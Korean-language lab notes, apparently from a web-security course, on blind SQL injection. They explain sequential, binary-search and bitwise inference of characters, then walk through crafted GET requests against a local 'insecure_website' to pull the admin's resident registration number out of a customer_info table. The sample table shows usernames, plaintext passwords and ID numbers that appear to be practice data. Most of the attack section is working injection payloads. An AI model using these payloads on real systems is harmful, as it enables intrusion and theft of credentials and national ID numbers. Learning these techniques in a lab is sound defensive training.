## Blind-Based 공격
    - Error based 공격, Union Based 공격이 불가할 때 주로 사용
        * 공격 우선 순위 : Union, Error, Blind 순
    - 데이터 추론 기법 종류
      - 순차 탐색
        - 속도 느림.
        - substring([대상쿼리],N,1)='a'
      - 이진 탐색
        - ascii(substring([대상쿼리],N,1))>80
          Ex) system_user 첫번째 글자 알아내기     
          select id from members where id='admin' and ascii(substring(system_user(),1,1))>80;      
          select id from members where id='admin' and ascii(substring(system_user(),1,1))<120;      
          select id from members where id='admin' and ascii(substring(system_user(),1,1))=114;      
          select char(114); -> r 출력       
       
      - 비트 단위 탐색
        select id from members where id='admin' and ascii(substring(database(),1,1))&1=1;      
        select id from members where id='admin' and ascii(substring(database(),1,1))&2=2;      
        select id from members where id='admin' and ascii(substring(database(),1,1))&4=4;      
        select char(112); -> p 출력
        
### Blind-Based 공격
Admin 계정의 주민번호를 획득해본다.      
    select * from customer_info;       
    +------+--------------+-------------+----------------+       
    | idx  | id           | password    | jumin          |          
    +------+--------------+-------------+----------------+         
    |    1 | admin        | @dmin!q@w#e | 810203-1023113 |         
    |    2 | gugucon      | 99c0n       | 861121-1244251 |         
    |    3 | sonata_zzang | sosohan123  | 890912-1601812 |         
    |    4 | halls        | halls920912 | 921001-1881222 |        
    |    5 | tkworld      | 1q2w3e4r    | 870405-1285264 |        
    +------+--------------+-------------+----------------+        
    ```

- SUBSTR(str, pos, len) pos번째 위치에서 len개 문자 읽어 드림.
    Ex) substring(system_user(),1,1) -> 'r'반환 ( 'root'에서 r)
1) Blind 공격 가능 여부 확인      
  http://127.0.0.1:8888/insecure_website/index.php?page=view&idx=3 and 1=1 => 출력 됨      
  http://127.0.0.1:8888/insecure_website/index.php?page=view&idx=3 and 1=2     
  => 출력 안됨      
  => 가능하다. 
2) burp Suit에서 Repeater로 보내서 테스트 해본다.     
   Response에 필터링을 걸어 출력여부를 체크해보는 것이 좋다. 날짜를 주로 사용한다.   
3) 길이를 구한다.     
   select id from customer_info limit 0,1; //limit 0,1 => 0번 idx에서 1개 가져옴.     
   select length((select jumin from customer_info limit 0,1)); 길이 가져옴     
   GET /insecure_website/index.php?page=view&idx=3+and+length((select+jumin+from+customer_info+where+id='admin'))>5      
4) 탐색 해본다.
    - 순차 탐색
        GET /insecure_website/index.php?page=view&idx=3+and+substring((select+jumin+from+customer_info+where+id='admin'),1,1)=8
    - 이진 탐색
        GET /insecure_website/index.php?page=view&idx=3+and+ascii(substring((select+jumin+from+customer_info+where+id='admin'),3,1))>49
    - 비트 연산 &는 %26      
        GET /insecure_website/index.php?page=view&idx=3+and+ascii(substring((select+jumin+from+customer_info+where+id='admin'),8,1))%261=1       
        GET /insecure_website/index.php?page=view&idx=3+and+ascii(substring((select+jumin+from+customer_info+where+id='admin'),8,1))%262=2       
        GET /insecure_website/index.php?page=view&idx=3+and+ascii(substring((select+jumin+from+customer_info+where+id='admin'),8,1))%264=4
